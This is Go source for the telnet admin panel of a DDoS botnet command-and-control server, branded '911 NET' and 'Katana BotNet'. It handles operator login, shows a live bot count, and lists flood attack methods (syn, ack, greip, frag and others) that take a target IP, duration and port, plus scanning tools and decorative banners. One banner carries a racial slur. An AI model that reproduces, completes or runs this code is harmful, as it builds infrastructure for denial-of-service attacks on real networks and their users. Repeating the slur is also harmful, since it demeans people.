package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}
//Cubby is daddy
func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[31;1m                                                       \r\n"))
	this.conn.Write([]byte("\033[31;1m                    WELCOME TO 911 NET                 \r\n"))
	this.conn.Write([]byte("\033[31;1m                                                       \r\n"))
	this.conn.Write([]byte("\033[31;1m      █████╗  ██╗ ██╗      ███╗   ██╗███████╗████████╗ \r\n"))
	this.conn.Write([]byte("\033[31;1m     ██╔══██╗███║███║      ████╗  ██║██╔════╝╚══██╔══╝ \r\n"))
	this.conn.Write([]byte("\033[31;1m     ╚██████║╚██║╚██║█████╗██╔██╗ ██║█████╗     ██║    \r\n"))
	this.conn.Write([]byte("\033[31;1m      ╚═══██║ ██║ ██║╚════╝██║╚██╗██║██╔══╝     ██║    \r\n"))
	this.conn.Write([]byte("\033[31;1m      █████╔╝ ██║ ██║      ██║ ╚████║███████╗   ██║    \r\n")) 
	this.conn.Write([]byte("\033[31;1m      ╚════╝  ╚═╝ ╚═╝      ╚═╝  ╚═══╝╚══════╝   ╚═╝    \r\n"))
	this.conn.Write([]byte("\033[31;1m                                                       \r\n"))
	this.conn.Write([]byte("\033[31;1m                   DOWNING WIFI LIKE                   \r\n"))
	this.conn.Write([]byte("\033[31;1m                       TERRORISTS                      \r\n"))
    this.conn.Write([]byte("\033[01;31m   ╔═══════════════════════════════════════════════╗   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;31m   ║\033[0m- - - - -Please Enter \033[01;31mLogin Info \033[0mBelow- - - - -\033[01;31m║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;31m   ╚═══════════════════════════════════════════════╝    \x1b[0m \r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;31mEnter your Username\033[01;33m: \033[01;31m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;31mPassword\x1b[0;33m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mERROR: INVALID CREDENTIALS\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Planes: %d | 911-NET | Connected as --> %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[0m                                                          \r\n"))
    	this.conn.Write([]byte("\033[31;1m       										     \r\n"))
	this.conn.Write([]byte("\033[31;1m  ╔═══════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\033[31;1m  ║                                                   ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  █████╗  ██╗ ██╗      ███╗   ██╗███████╗████████╗ ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║ ██╔══██╗███║███║      ████╗  ██║██╔════╝╚══██╔══╝ ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║ ╚██████║╚██║╚██║█████╗██╔██╗ ██║█████╗     ██║    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  ╚═══██║ ██║ ██║╚════╝██║╚██╗██║██╔══╝     ██║    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  █████╔╝ ██║ ██║      ██║ ╚████║███████╗   ██║    ║ \r\n")) 
	this.conn.Write([]byte("\033[31;1m  ║  ╚════╝  ╚═╝ ╚═╝      ╚═╝  ╚═══╝╚══════╝   ╚═╝    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║                                                   ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║           DOWNING WIFI LIKE A TERRORIST           ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ╚═══════════════════════════════════════════════════╝ \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[31m 911\033[90m#\033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[31;1m  ╔═══════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\033[31;1m  ║                                                   ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  █████╗  ██╗ ██╗      ███╗   ██╗███████╗████████╗ ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║ ██╔══██╗███║███║      ████╗  ██║██╔════╝╚══██╔══╝ ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║ ╚██████║╚██║╚██║█████╗██╔██╗ ██║█████╗     ██║    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  ╚═══██║ ██║ ██║╚════╝██║╚██╗██║██╔══╝     ██║    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║  █████╔╝ ██║ ██║      ██║ ╚████║███████╗   ██║    ║ \r\n")) 
	this.conn.Write([]byte("\033[31;1m  ║  ╚════╝  ╚═╝ ╚═╝      ╚═╝  ╚═══╝╚══════╝   ╚═╝    ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║                                                   ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ║           DOWNING WIFI LIKE A TERRORIST           ║ \r\n"))
	this.conn.Write([]byte("\033[31;1m  ╚═══════════════════════════════════════════════════╝ \r\n"))
    this.conn.Write([]byte("\033[0m                                                           \r\n"))
	continue
		}	

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
		    this.conn.Write([]byte("\033[01;31m               HELP MENU                                         \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╔══════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ ATTACK    - \033[0mAttack Methods          \033[01;31m ║   \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ BANNERS   - \033[0mBanners Menu            \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ TOOLS     - \033[0mTools Menu              \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ ADMIN     - \033[0mAdmin Menu              \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ CLEAR/CLS - \033[0mClear Screen            \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╚══════════════════════════════════════╝   \x1b[0m \r\n"))
            continue
        }

        if err != nil || cmd == "ADMIN" || cmd == "admin" {
		    this.conn.Write([]byte("\033[01;31m               ADMIN MENU                                         \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╔══════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ ADDBASIC   - \033[0mBasic 911 User         \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ ADDADMIN   - \033[0mAdmin 911 User         \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ REMOVEUSER - \033[0mRemove user            \033[01;31m ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╚══════════════════════════════════════╝   \x1b[0m \r\n"))
            continue
        }

        if err != nil || cmd == "ATTACKS" || cmd == "METHODS" || cmd == "attacks" || cmd == "attack" || cmd == "ATTACK" || cmd == "methods" || cmd == "method" || cmd == "METHOD" {

            this.conn.Write([]byte("\033[01;31m               ATTACK MENU                   \x1b[0m \r\n")) 
            this.conn.Write([]byte("\033[01;31m ╔══════════════════════════════════════╗    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ plain  \033[0m(ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ greip \033[0m (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ tcpall \033[0m(ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ game \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ std  \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ ack  \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ syn \033[0m   (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ asyn \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ usyn \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ frag \033[0m  (ip) (time) dport=(port)      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╚══════════════════════════════════════╝    \x1b[0m \r\n"))
            continue
        }

        if err != nil || cmd == "TOOLS" || cmd == "TOOL" || cmd == "tool" || cmd == "tools" {
            this.conn.Write([]byte("\033[01;31m               TOOLS MENU                                         \x1b[0m \r\n")) 
            this.conn.Write([]byte("\033[01;31m ╔══════════════════════════════════════╗    \x1b[0m \r\n")) 
			this.conn.Write([]byte("\033[01;31m ║ /iplookup     \033[0mIP Lookup              \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /portscan     \033[0mPortscans IP           \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /whois        \033[0mWHOIS Search           \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /traceroute   \033[0m0mTraceroute On IP     \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /resolve      \033[0mResolves A Website     \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /reversedns   \033[0mFinds DNS Of IP        \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /asnlookup    \033[0mFinds ASN Of Ip        \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /subnetcalc   \033[0mCalculates A Subnet    \033[01;31m║    \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ /zonetransfer \033[0mShows ZoneTransfer     \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╚══════════════════════════════════════╝    \x1b[0m \r\n"))

            continue
        }
        if err != nil || cmd == "BANNERS" || cmd == "banners" {
            this.conn.Write([]byte("\033[01;31m ╔══════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :katana   - \033[0mShows OG Katana Banner   \033[01;31m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :quote    - \033[0mShows Quote Banner       \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :batman   - \033[0mShows Batman Signal      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :sao      - \033[0mShows SAO Banner         \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :reaper   - \033[0mShows Reaper Banner      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :hentai   - \033[0mShows Hentai Banner      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :xanax    - \033[0mShows Xanax Banner       \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :saikin   - \033[0mShows Saikin Banner      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :kitty    - \033[0mShows Kitty Banner       \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :dood     - \033[0mShows Anime Dood Banner  \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :mickey   - \033[0mShows Mickey Banner      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :sora     - \033[0mShows Sora Banner        \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :owari    - \033[0mShows Owari Banner       \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :hoho     - \033[0mShows HoHo Banner        \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :senpai   - \033[0mShows Senpai Banner      \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :neko     - \033[0mShows Neko Banner        \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ :timeout  - \033[0mShows Timeout Banner     \033[01;31m║    \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ╚══════════════════════════════════════╝   \x1b[0m \r\n"))
            continue
        }        
		if err != nil || cmd == ":katana" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m████████\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m███\x1b[0;37m╗   \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║ \x1b[0;31m██\x1b[0;37m╔╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗╚══\x1b[0;31m██\x1b[0;37m╔══╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m████\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\033[0;31m     █████\x1b[0;37m╔╝ \x1b[0;31m███████\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m███████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m║\x1b[0;31m███████\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╔═\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║ ╚\x1b[0;31m████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            continue
        }
        if err != nil || cmd == ":neko" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\x1b[1;96m                 ███\x1b[0;95m╗   \x1b[0;96m██\x1b[0;95m╗\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██████\x1b[0;95m╗     \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ████\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔════╝\x1b[0;96m██\x1b[0;95m║ \x1b[0;96m██\x1b[0;95m╔╝\x1b[0;96m██\x1b[0;95m╔═══\x1b[0;96m██\x1b[0;95m╗    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m╔\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║\x1b[0;96m█████\x1b[0;95m╗  \x1b[0;96m█████\x1b[0;95m╔╝ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║╚\x1b[0;96m██\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔══╝  \x1b[0;96m██\x1b[0;95m╔═\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║ ╚\x1b[0;96m████\x1b[0;95m║\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║  \x1b[0;96m██\x1b[0;95m╗╚\x1b[0;96m██████\x1b[0;95m╔╝    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝     \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                              \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                           I'm a little kitty!                         \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                               \r\n\x1b[0m"))
            continue
        }
        if err != nil || cmd == ":batman" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;34m   MMMMMMMMMMMMMMMMMMMMM         \x1b[0;31mScreech Nigga        \x1b[0;34mMMMMMMMMMMMMMMMMMMMMM       \r\n"))
            this.conn.Write([]byte("\033[0;34m    `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'       \r\n"))
            this.conn.Write([]byte("\033[0;34m      `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'         \r\n"))
            this.conn.Write([]byte("\033[0;34m        MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m        .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.           \r\n"))
            this.conn.Write([]byte("\033[0;34m       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM         \r\n"))
            this.conn.Write([]byte("\033[0;34m                      `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                       \r\n"))
            this.conn.Write([]byte("\033[0;34m                             `MMMMMMMMMMMMMMMMMM'                           \r\n"))
            this.conn.Write([]byte("\033[0;34m                                 `MMMMMMMMMM'                                     \r\n"))
            this.conn.Write([]byte("\033[0;34m                                    MMMMMM                                \r\n"))
            this.conn.Write([]byte("\033[0;34m                                     MMMM                                         \r\n"))
            this.conn.Write([]byte("\033[0;34m                                      MM                                         \r\n"))
            continue
        }
        if err != nil || cmd == ":quote" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m          \r\n"))
            this.conn.Write([]byte("\033[0;31m         __                                           __   \r\n"))
            this.conn.Write([]byte("\033[0;31m        (\x1b[0;33m**\x1b[0;31m)                                         (\x1b[0;33m**\x1b[0;31m)   \r\n"))
            this.conn.Write([]byte("\033[0;34m        IIII                                         \x1b[0;34mIIII   \r\n"))
            this.conn.Write([]byte("\033[0;34m        ####                                         \x1b[0;34m####   \r\n"))
            this.conn.Write([]byte("\033[0;34m        HHHH  \x1b[0;33m   Madness comes\x1b[0;31m, \x1b[0;33mand madness goes     \x1b[0;34mHHHH   \r\n"))
            this.conn.Write([]byte("\033[0;34m        HHHH  \x1b[0;33m  An insane place, with insane moves   \x1b[0;34mHHHH   \r\n"))
            this.conn.Write([]byte("\033[0;34m        ####  \x1b[0;33m Battles without, for battles within   \x1b[0;34m####   \r\n"))
            this.conn.Write([]byte("\033[0;31m     ___\x1b[0;34mIIII\x1b[0;31m___        \x1b[0;33mWhere evil lives\x1b[0;31m,          \x1b[0;31m___\x1b[0;34mIIII\x1b[0;31m___   \r\n"))
            this.conn.Write([]byte("\033[0;31m  .-`_._    _._`-.     \x1b[0;33m and evil rules        \x1b[0;31m .-`_._   _._`-.   \r\n"))
            this.conn.Write([]byte("\033[0;31m |/``  .`*/`.  ``*|    \x1b[0;33mBreaking them up\x1b[0;31m,      \x1b[0;31m |/``  .`*/`.  ``*|   \r\n"))
            this.conn.Write([]byte("\033[0;31m `     }    {     '  \x1b[0;33mjust breaking them in    \x1b[0;31m `    }    {      '   \r\n"))
            this.conn.Write([]byte("\033[0;31m       ) () (  \x1b[0;33mQuickest way out\x1b[0;31m, \x1b[0;33mquickest way wins  \x1b[0;31m) () (   \r\n"))
            this.conn.Write([]byte("\033[0;31m       ( :: )      \x1b[0;33mNever disclose\x1b[0;31m, \x1b[0;33mnever betray     \x1b[0;31m( :: )   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | :: |   \x1b[0;33mCease to speak or cease to breath   \x1b[0;31m| :: |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | )( |       \x1b[0;33m And when you kill a man\x1b[0;31m,       \x1b[0;31m| )( |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | || |          \x1b[0;33myou're a murderer           \x1b[0;31m | || |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | || |            \x1b[0;33m Kill many                 \x1b[0;31m| || |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | || |        \x1b[0;33mand you\x1b[0;31m'\x1b[0;33mre a conqueror         \x1b[0;31m| || |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | || |        \x1b[0;33mKill them all \x1b[0;31m... \x1b[0;33mOoh\x1b[0;31m..        \x1b[0;31m| || |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       | || |           \x1b[0;33mOh you\x1b[0;31m'\x1b[0;33mre a God\x1b[0;31m!            \x1b[0;31m| || |   \r\n"))
            this.conn.Write([]byte("\033[0;31m       ( () )                      \x1b[0;31m -\x1b[0;33mMegadeth      \x1b[0;31m ( () )   \r\n"))
            this.conn.Write([]byte("\033[0;31m        \\  /                                         \\  /   \r\n"))
            this.conn.Write([]byte("\033[0;31m         \\/                                           \\/   \r\n"))
            continue
        }
        if err != nil || cmd == ":senpai" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m███\x1b[1;36m╗   \x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██████\x1b[1;36m╗  \x1b[1;35m█████\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ██\x1b[1;36m╔════╝\x1b[1;35m██\x1b[1;36m╔════╝\x1b[1;35m████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m█████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m╔\x1b[1;35m██\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██████\x1b[1;36m╔╝\x1b[1;35m███████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚════\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══╝  \x1b[1;35m██\x1b[1;36m║╚\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔═══╝ \x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m║\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║ ╚\x1b[1;35m████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║     \x1b[1;35m██\x1b[1;36m║  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m              \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[95;1m" + username + " \x1b[1;37mTo The Katana BotNet\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m               \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\t \r\n"))     
            continue
        }
        if err != nil || cmd == ":sao" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t\033[37m     .---.    \t                            \t\033[37m       .---.    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m .---^ - ^---.\t                            \t\033[37m   .---^ - ^---.\r\n"))
            this.conn.Write([]byte("\t\033[37m :___________:\t                            \t\033[37m   :___________:\r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[36m  ██████  ▄▄▄       \033[31m▒\033[36m█████  \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒\033[36m██    \033[31m▒ ▒\033[36m████▄    \033[31m▒\033[36m██\033[31m▒  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m░ ▓\033[36m██▄  \033[31m ▒\033[36m██  ▀█▄  \033[31m▒\033[36m██\033[31m░  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
